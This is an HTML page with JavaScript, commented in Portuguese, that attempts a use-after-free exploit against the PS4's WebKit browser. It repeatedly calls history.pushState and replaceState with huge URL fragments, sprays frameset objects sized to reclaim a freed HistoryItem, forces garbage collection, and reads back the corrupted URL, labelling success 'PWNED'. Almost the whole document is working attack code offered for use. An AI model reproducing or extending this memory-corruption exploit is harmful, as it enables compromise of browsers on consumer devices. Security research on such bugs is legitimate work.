<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Small Object Attack</title>
<style>
    body { background-color: #000; color: #aaaaff; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #55f; background: #002; color: #fff;
        text-transform: uppercase;
    }
    #log { border: 1px solid #335; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { color: #fff; background-color: #00f; padding: 5px; font-weight: bold;}
</style>
</head>
<body>
<h2>PS4 WebKit - Small Object Reclaim (Container Attack)</h2>
<div id="status">Alvo: HistoryItem / SSV (~80-160 bytes)</div>

<button onclick="runSmallAttack()">INICIAR ATAQUE AO CONTAINER</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

// TÉCNICA PSFREE: GC para garantir limpeza do Small Heap
function forceGC() {
    for (let i = 0; i < 2; i++) {
        new Uint8Array(4 * 1024 * 1024);
    }
}

async function runSmallAttack() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Preparando...";

    // === ESTRATÉGIA ===
    // Ignoramos o buraco de 340KB da string.
    // Vamos tentar pegar a vaga do objeto HistoryItem que segurava essa string.
    // Tamanho estimado: 80 a 160 bytes.
    // Frameset: Cada vírgula = 8 bytes.
    // Range: 10 a 30 vírgulas.

    log("1. Pré-calculando Small Sprays...");
    let payloads = [];
    
    // Varredura fina (passo de 1 vírgula = 8 bytes de precisão)
    for(let i = 8; i < 40; i++) {
        try {
            payloads.push(",".repeat(i));
        } catch(e) {}
    }
    log(`Gerados ${payloads.length} payloads (64 bytes a 320 bytes).`);

    // === TRIGGER UAF (INTACTO) ===
    log("2. Disparando UAF Gigante (para liberar o Container)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        // MOMENTO CRÍTICO
        if (i === 47) {
            log(">>> SPRAY DE OBJETOS PEQUENOS <<<");
            
            // 1. Libera memória
            setTimeout(() => history.back(), 0);
            
            // 2. Inunda o Small Heap com Framesets
            // Isso deve atropelar o HistoryItem recém-liberado
            doSmallSpray(payloads);
            
            // 3. Força GC para consolidar
            setTimeout(() => forceGC(), 10);
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(300);

    // === VERIFICAÇÃO ===
    checkResult();
}

function doSmallSpray(payloads) {
    // Cria milhares de objetos pequenos rapidamente
    // Para cada tamanho de payload, criamos 100 instâncias
    for(let p of payloads) {
        for(let k=0; k<20; k++) {
            let f = document.createElement("frameset");
            f.rows = p;
            keepAlive.push(f);
        }
    }
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    
    // Se sobrescrevermos o HistoryItem, o ponteiro da string será corrompido.
    // Isso deve causar uma de duas coisas:
    // 1. Crash do navegador (Tela de Erro CE-...). ISSO É SUCESSO.
    // 2. URL mudando para caracteres aleatórios/inválidos.
    
    log("URL Length: " + url.length);
    
    // Checagem de integridade
    let isV = true;
    for(let i=1000; i<1100; i++) {
        if(url.charCodeAt(i) !== 0x56) {
            isV = false;
            break;
        }
    }

    if(!isV) {
        log("!!! MUDANÇA DETECTADA !!!", "success");
        log("O Container foi corrompido!");
        let sample = "";
        for(let k=1000; k<1020; k++) sample += url.charCodeAt(k).toString(16) + " ";
        log("Dump: " + sample);
        statusEl.innerText = "PWNED: CONTAINER";
    } else {
        log("Ainda estável ('V').");
        log("Se o navegador CRASHAR agora ou em breve, comemore.");
    }
}
</script>
</body>
</html>
